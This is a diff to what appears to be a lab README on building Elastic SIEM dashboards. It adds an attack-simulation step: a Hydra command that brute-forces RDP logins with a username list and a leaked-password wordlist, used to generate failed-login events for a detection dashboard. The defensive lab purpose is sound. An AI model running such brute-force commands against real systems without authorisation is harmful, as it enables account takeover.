@@ -1,5 +1,13 @@
 #  Elastic SIEM Dashboards
 
+## Attack Simulation
+* Use Hydra to Bruteforce RDP Login Credentials
+---
+```bash
+hydra -L /usr/share/wordlists/SecLists-master/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists-master/Passwords/Leaked-Databases/rockyou-05.txt rdp://Target-IP:3389 -t 16 -I -V
+
+```
+
 
 ##  Creating a Dashboard for Failed Login Attempts
 ---
